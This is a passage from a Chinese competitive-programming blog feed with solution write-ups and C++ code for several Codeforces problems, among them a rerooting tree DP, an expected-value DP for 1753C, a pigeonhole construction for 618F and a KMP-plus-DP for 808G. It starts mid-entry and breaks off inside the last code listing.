class="math inline">\(n\)</span> 个城市连成了一颗树，有 <span
class="math inline">\(n - 1\)</span>
条道路连接了所有城市。每条道路只能单向通行。现在政府需要决定选择哪个城市为首都。假如城市
i
成为了首都，那么为了使首都能到达任意一个城市，不得不将一些道路翻转方向，记翻转道路的条数为
<span class="math inline">\(k\)</span>。你的任务是找到所有满足 <span
class="math inline">\(k\)</span> 最小的首都。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>这道题我们可以考虑使用树形 DP 解决。</p>
<h2 id="dp-求解">DP 求解</h2>
<p>首先我们选定任意一个节点为这棵树的根，这里我们以 <span
class="math inline">\(1\)</span> 节点为例。</p>
<p>接着跑一遍 DP，此时 DP
存储的是从这个节点出发，到达该节点为根的子树中的所有节点所需要最少翻转道路的次数。</p>
<p>显然我们可以推出下列状态转移方程（<span
class="math inline">\(f_i\)</span> 中 <span
class="math inline">\(i\)</span> 表示节点，<span
class="math inline">\(e\)</span> 表示子以 <span
class="math inline">\(i\)</span> 为根的子树中从 <span
class="math inline">\(i\)</span> 出发的边的集合，<span
class="math inline">\(eRev\)</span> 表示子以 <span
class="math inline">\(i\)</span> 为根的子树中指向 <span
class="math inline">\(i\)</span> 的边的集合）：</p>
<p><span class="math display">\[
f_i =
\begin{cases}
f_j &amp; j \in e \\
f_j + 1 &amp; j \in eRev
\end{cases}
\]</span></p>
<p>此时 <span class="math inline">\(f_1\)</span> 则为以 <span
class="math inline">\(1\)</span> 为首都的答案。</p>
<h2 id="换根">换根</h2>
<p>虽然我们可以以每一个点为首都，分别 DP
一次得解，但这种方法的时间复杂度是 <span
class="math inline">\(O(n^2)\)</span>，并不理想。故我们可考虑用其他方法求解。</p>
<p>基于上面以 <span class="math inline">\(1\)</span> 为首都的
DP，我们可以在此数据上 <strong>换根</strong>
以求出以其他节点为首都的答案。</p>
<p>对于换根，我们可以从 <span class="math inline">\(1\)</span>
节点开始跑第二遍 DP。</p>
<p>仍然以 <span class="math inline">\(1\)</span> 为根，我们初始化 <span
class="math inline">\(g_1 = f_1\)</span>，其中 <span
class="math inline">\(g_i\)</span> 表示以 <span
class="math inline">\(i\)</span> 为首都至少需要翻转多少条道路。</p>
<p>对于节点 <span class="math inline">\(i\)</span>，若 <span
class="math inline">\(j\)</span> 是 <span
class="math inline">\(i\)</span> 为根的子树中从 <span
class="math inline">\(i\)</span> 出发的边所到达的节点，说明从 <span
class="math inline">\(j\)</span> 到 <span
class="math inline">\(i\)</span> 路是反的，从 <span
class="math inline">\(j\)</span> 到 <span
class="math inline">\(i\)</span> 比从 <span
class="math inline">\(i\)</span> 到 <span
class="math inline">\(j\)</span> 需要多翻转一条边，答案则为 <span
class="math inline">\(g_i + 1\)</span>；</p>
<p>同理，若 <span class="math inline">\(j\)</span> 是 <span
class="math inline">\(i\)</span> 为根的子树中指向 <span
class="math inline">\(i\)</span> 的边中出发的节点，说明从 <span
class="math inline">\(j\)</span> 到 <span
class="math inline">\(i\)</span> 路是正的，从 <span
class="math inline">\(j\)</span> 到 <span
class="math inline">\(i\)</span> 比从 <span
class="math inline">\(i\)</span> 到 <span
class="math inline">\(j\)</span> 需要少翻转一条边，答案则为 <span
class="math inline">\(g_i - 1\)</span>；</p>
<p>换句话说，我们有下列转移方程：</p>
<p><span class="math display">\[
g_i =
\begin{cases}
g_j + 1 &amp; j \in e \\
g_j - 1 &amp; j \in eRev
\end{cases}
\]</span></p>
<p>对于求 <span class="math inline">\(g_j\)</span>
的过程，我们可以形象地想象成这棵树的根从 <span
class="math inline">\(i\)</span> 换到了 <span
class="math inline">\(j\)</span>。我们把这种操作称作
<strong>换根</strong>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">200000</span>, INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; e[MAXN + <span class="number">1</span>], eRev[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> f[MAXN + <span class="number">1</span>], ch[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">bool</span> vis[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (vis[p]) <span class="keyword">return</span> f[p];</span><br><span class="line">    vis[p] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> nodes : e[p]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!vis[nodes]) &#123;</span><br><span class="line">            f[p] += <span class="built_in">dp</span>(nodes);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> nodes : eRev[p]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!vis[nodes]) &#123;</span><br><span class="line">            f[p] += <span class="built_in">dp</span>(nodes) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> f[p];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> p)</span> </span>&#123;</span><br><span class="line">    vis[p] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> nodes : e[p]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!vis[nodes]) &#123;</span><br><span class="line">            ch[nodes] = ch[p] + <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">dfs</span>(nodes);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> nodes : eRev[p]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!vis[nodes]) &#123;</span><br><span class="line">            ch[nodes] = ch[p] - <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">dfs</span>(nodes);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        e[a].<span class="built_in">push_back</span>(b);</span><br><span class="line">        eRev[b].<span class="built_in">push_back</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(f, <span class="number">0</span>, <span class="built_in">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(vis, <span class="literal">false</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line">    <span class="built_in">dp</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(ch, <span class="number">0</span>, <span class="built_in">sizeof</span>(ch));</span><br><span class="line">    <span class="built_in">memset</span>(vis, <span class="literal">false</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line">    ch[<span class="number">1</span>] = f[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ans = INF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        ans = std::<span class="built_in">min</span>(ans, ch[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)  &#123;</span><br><span class="line">        <span class="keyword">if</span> (ch[i] == ans) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>Codeforces</tag>
        <tag>树形 DP</tag>
        <tag>换根</tag>
      </tags>
  </entry>
  <entry>
    <title>「Codeforces 1753C」Wish I Knew How to Sort - 概率与期望</title>
    <url>/cf-1753c/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://codeforces.com/problemset/problem/1753/C">Codeforces
链接</a></p>
<p>你有一个只含 <span class="math inline">\(0\)</span> 和 <span
class="math inline">\(1\)</span> 的 <span
class="math inline">\(n\)</span>
位序列，你需要将这个序列排序。对于这个序列，你每次可以随机地选择两个数进行交换，求将这个序列排好序所交换次数的期望
<span class="math inline">\(\mod 998244353\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题求的是期望步数，可考虑使用 DP 解决。我们统计这个序列中有 <span
class="math inline">\(\text{cnt}\)</span> 个 <span
class="math inline">\(0\)</span>，于是这个问题可以转化为将所有的 <span
class="math inline">\(0\)</span> 移动到前 <span
class="math inline">\(\text{cnt}\)</span> 位需要的步数的期望。我们设
<span class="math inline">\(f_i\)</span> 表示前 <span
class="math inline">\(\text{cnt}\)</span> 位有 <span
class="math inline">\(i\)</span> 个 <span
class="math inline">\(0\)</span> 的情况下排好序所需要的期望步数，显然
<span class="math inline">\(f_\text{cnt} = 0\)</span>。如果我们将 <span
class="math inline">\(f_i\)</span> 状态变化为 <span
class="math inline">\(f_{i + 1}\)</span> 状态，我们需要将前 <span
class="math inline">\(\text{cnt}\)</span> 位中的一个 <span
class="math inline">\(1\)</span> 和后 <span
class="math inline">\(\text{n - cnt}\)</span> 位的一个 <span
class="math inline">\(0\)</span> 进行交换。选出这对的概率为 <span
class="math inline">\(p = \frac{(\text{cnt} - i) \times (\text{cnt} -
i)}{ \frac{n \times (n - 1)}{2} } = \frac{2 \times (\text{cnt} - i)^2}{n
\times (n -
1)}\)</span>。于是我们可以通过期望的线性性质得到以下的状态转移方程：</p>
<p><span class="math display">\[
\begin{align*}
f_i &amp;= p \times f_{i + 1} + (1 - p) \times f_i + 1 \\
f_i &amp;= f_{i + 1} + \frac{n \times (n - 1)}{2 \times (\text{cnt} -
i)^2}
\end{align*}
\]</span></p>
<p>状态转移方程的除法可以用快速幂求逆元解决。最后我们统计原序列中前
<span class="math inline">\(\text{cnt}\)</span> 项中有 <span
class="math inline">\(\text{now}\)</span> 个 <span
class="math inline">\(0\)</span>，答案即为 <span
class="math inline">\(f_\text{now}\)</span>。时间复杂度为 <span
class="math inline">\(O(kn), k = \log 998244353\)</span></p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MOD = <span class="number">998244353</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">long</span> <span class="type">long</span> <span class="title">pow</span><span class="params">(<span class="type">const</span> <span class="type">int</span> n, <span class="type">const</span> <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> num = n, t = k; t; num = num * num % MOD, t &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (t &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            ans = ans * num % MOD;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>, now = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="keyword">if</span> (a[i] == <span class="number">0</span>) cnt++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cnt; i++) <span class="keyword">if</span> (a[i] == <span class="number">0</span>) now++;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">f</span><span class="params">(cnt + <span class="number">1</span>)</span></span>;</span><br><span class="line">    f[cnt] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = cnt - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        f[i] = (f[i + <span class="number">1</span>] + (<span class="number">1ll</span> * n * (n - <span class="number">1</span>) % MOD * <span class="built_in">pow</span>(<span class="number">2</span>, MOD - <span class="number">2</span>) % MOD * <span class="built_in">pow</span>(cnt - i, MOD - <span class="number">2</span>) % MOD * <span class="built_in">pow</span>(cnt - i, MOD - <span class="number">2</span>) % MOD)) % MOD;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, f[now]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>概率与期望</tag>
        <tag>数学</tag>
        <tag>Codeforces</tag>
      </tags>
  </entry>
  <entry>
    <title>「Codeforces 618F」Double Knapsack - 构造 + 鸽巢原理</title>
    <url>/cf-618f/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://codeforces.com/problemset/problem/618/F">Codeforces
链接</a></p>
<p>给你两个可重集 <span class="math inline">\(A, B\)</span>，<span
class="math inline">\(A, B\)</span> 的元素个数都为 <span
class="math inline">\(n\)</span>，它们中每个元素的大小 <span
class="math inline">\(x\in [1,n]\)</span>。请你分别找出 <span
class="math inline">\(A, B\)</span>
的子集，使得它们中的元素之和相等。</p>
<p>数据范围：<span class="math inline">\(1 \leq n \leq 10^6\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p><del>我甚至菜到这是我做的第一道紫题</del></p>
<h2 id="构造方法">构造方法</h2>
<p>本题显然需要构造。</p>
<p>首先我们维护 <span class="math inline">\(A\)</span> 的前缀和 <span
class="math inline">\(\text{sA}\)</span>，<span
class="math inline">\(B\)</span> 的前缀和 <span
class="math inline">\(\text{sB}\)</span>。然后维护双指针指向两前缀和的第一个元素。这时我们将指向
<span class="math inline">\(\text{sA}\)</span> 的指针不停加 <span
class="math inline">\(1\)</span>，同时指向 <span
class="math inline">\(\text{sB}\)</span>
的指针在满足下一个位置指的数小于等于 <span
class="math inline">\(\text{sA}\)</span>
的指针所指的数时不停向前移动，最后记录下 <span
class="math inline">\(\text{sA}\)</span> 的指针指向的值和 <span
class="math inline">\(\text{sB}\)</span>
指针指向的值的差及下标。若差已经存在，将存在的差的下标的前面的数删去后后面的差即可变为
<span class="math inline">\(0\)</span>，故两差坐标之间的数即为答案。</p>
<h2 id="正确性证明">正确性证明</h2>
<p>接下来我们需要证明本题绝对有解，且所有解中至少有一种解所取的子集在原集合中是相邻的。</p>
<p>设指针下标为 <span class="math inline">\(p\)</span>，<span
class="math inline">\(q\)</span>。该题始终满足 <span
class="math inline">\(\text{sA}_p - \text{sB}_q &lt;
n\)</span>，若两差大于 <span class="math inline">\(n\)</span>，则 <span
class="math inline">\(q\)</span>
必定可以后移，不为最优。因为集合中的所有数都小于等于 <span
class="math inline">\(n\)</span>。</p>
<p>所以我们目前有 <span class="math inline">\(sA_0 - sB_q, sA_1 - sB_q,
sA_3 - sB_q, \cdots, sA_n - sB_q\)</span> 总共 <span
class="math inline">\(n + 1\)</span> 个差。但所有差只有 <span
class="math inline">\(0, 1, 2, \cdots, n - 1\)</span> 总共 <span
class="math inline">\(n\)</span>
种。根据鸽巢原理可知至少有一种差出现了不止一次。故用该方法本题保证有解。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a[MAXN + <span class="number">1</span>], b[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> sa[MAXN + <span class="number">1</span>], sb[MAXN + <span class="number">1</span>];</span><br><span class="line">    sa[<span class="number">0</span>] = sb[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">        sa[i] = sa[i - <span class="number">1</span>] + a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">        sb[i] = sb[i - <span class="number">1</span>] + b[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">bool</span> vis[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="type">static</span> std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pos[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(vis, <span class="literal">false</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line">    <span class="type">int</span> p = <span class="number">1</span>, q = <span class="number">0</span>;</span><br><span class="line">    vis[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="type">bool</span> find = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; p &lt;= n; p++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (q &lt; n &amp;&amp; sb[q + <span class="number">1</span>] &lt;= sa[p]) q++;</span><br><span class="line">        <span class="keyword">if</span> (vis[sa[p] - sb[q]]) &#123;</span><br><span class="line">            find = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            vis[sa[p] - sb[q]] = <span class="literal">true</span>;</span><br><span class="line">            pos[sa[p] - sb[q]] = std::<span class="built_in">make_pair</span>(p, q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (find) &#123;</span><br><span class="line">        std::cout &lt;&lt; p - pos[sa[p] - sb[q]].first &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = pos[sa[p] - sb[q]].first + <span class="number">1</span>; i &lt;= p; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        std::cout &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; q - pos[sa[p] - sb[q]].second &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = pos[sa[p] - sb[q]].second + <span class="number">1</span>; i &lt;= q; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        std::cout &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> std::cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>Codeforces</tag>
        <tag>贪心</tag>
        <tag>构造</tag>
        <tag>前缀和</tag>
        <tag>鸽巢原理</tag>
      </tags>
  </entry>
  <entry>
    <title>「Codeforces 808G」Anthem of Berland - KMP + DP</title>
    <url>/cf-808g/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://codeforces.com/problemset/problem/808/G">Codeforces
链接</a></p>
<p>给定 <span class="math inline">\(s\)</span> 串和 <span
class="math inline">\(t\)</span> 串，其中 <span
class="math inline">\(s\)</span> 串包含小写字母和问号，<span
class="math inline">\(t\)</span> 串只包含小写字母。</p>
<p>假设共有 <span class="math inline">\(k\)</span> 个问号。</p>
<p>你需要给把每个问号变成一个小写字母，共有 <span
class="math inline">\(26^k\)</span> 种可能。</p>
<p>对于每种可能，设 <span class="math inline">\(t\)</span> 匹配 <span
class="math inline">\(s\)</span> 的次数为 <span
class="math inline">\(f_i\)</span>，请输出 <span
class="math inline">\(\max(f_i)\)</span> 。</p>
<p><span class="math inline">\(1\leq |s|,|t|\leq 10^5,|s|\cdot |t|\leq
10^7\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>对于匹配字符串，显然我们可以用 KMP
思想解决。而对于匹配计数，我们可以使用 DP 解决。</p>
<p>我们可以先使用 KMP 求出 <span class="math inline">\(t\)</span> 的
<span class="math inline">\(\text{next}\)</span> 数组。</p>
<p>假设 <span class="math inline">\(s\)</span> 长度为 <span
class="math inline">\(n\)</span>、<span class="math inline">\(t\)</span>
长度为 <span class="math inline">\(m\)</span>。我们可以设 <span
class="math inline">\(f_{i, j}\)</span> 表示使用 KMP 匹配时 <span
class="math inline">\(s_i\)</span> 匹配到 <span
class="math inline">\(t_j\)</span> 情况下匹配成功的次数。假设通过 KMP
匹配可得 <span class="math inline">\(s_{i + 1}\)</span> 匹配 <span
class="math inline">\(t_k\)</span>，于是我们可以得到下列状态转移方程：</p>
<p><span class="math display">\[
f_{i + 1, k} = \max\{ f_{i + 1, k}, f_{i, j} + [k = m] \}
\]</span></p>
<p>于是我们只需要枚举 <span class="math inline">\(k\)</span>
即可。而对于每个 <span
class="math inline">\(t_i\)</span>，我们可以预处理出 <span
class="math inline">\(26\)</span> 种字符所对应的 KMP
跳跃情况。这样可将时间复杂度降至 <span
class="math inline">\(O(nm)\)</span>。</p>
<p>接下来我们需要解决的是如何在时间复杂度为 <span
class="math inline">\(O(m)\)</span> 情况下预处理 <span
class="math inline">\(t_i\)</span> 的跳跃情况。假设 <span
class="math inline">\(\text{jump}_{i, j}\)</span> 表示已经匹配 <span
class="math inline">\(t_i\)</span>，在匹配 <span
class="math inline">\(t_{i + 1}\)</span> 与字符 <span
class="math inline">\(j\)</span> 进行匹配时跳转的坐标。通过 KMP
匹配，我们可以很显然得得出：<span class="math inline">\(\text{jump}_{i,
t_{i + 1}} = i + 1\)</span>，且只有这种情况坐标增加，其余均为 <span
class="math inline">\(\text{jump}_{i, j} = \text{jump}_{\text{next}_i,
j}\)</span>。于是我们可以通过递推预处理该数组。时间复杂度 <span
class="math inline">\(O(m)\)</span></p>
<p>时间复杂度为 <span class="math inline">\(O(nm)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    std::cout.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">    std::string s, t;</span><br><span class="line">    std::cin &gt;&gt; s &gt;&gt; t;</span><br><span class="line">    <span class="type">int</span> n = s.<span class="built_in">size</span>(), m = t.<span class="built_in">size</span>();</span><br><span class="line">    s = <span class="string">&#x27; &#x27;</span> + s, t = <span class="string">&#x27; &#x27;</span> + t + <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">next</span><span class="params">(m + <span class="number">1</span>)</span></span>;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &amp;&amp; t[j + <span class="number">1</span>] != t[i]) j = next[j];</span><br><span class="line">        <span class="keyword">if</span> (t[j + <span class="number">1</span>] == t[i]) j++;</span><br><span class="line">        next[i] = j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;std::array&lt;<span class="type">int</span>, &#x27;z&#x27; + 1&gt;&gt; <span class="built_in">jump</span>(m + <span class="number">1</span>);</span><br><span class="line">    jump[<span class="number">0</span>][t[<span class="number">1</span>]] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="string">&#x27;a&#x27;</span>; j &lt;= <span class="string">&#x27;z&#x27;</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; m &amp;&amp; j == t[i + <span class="number">1</span>]) jump[i][j] = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> jump[i][j] = jump[next[i]][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;std::vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">f</span>(n + <span class="number">1</span>, std::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m + <span class="number">1</span>, INT_MIN));</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> 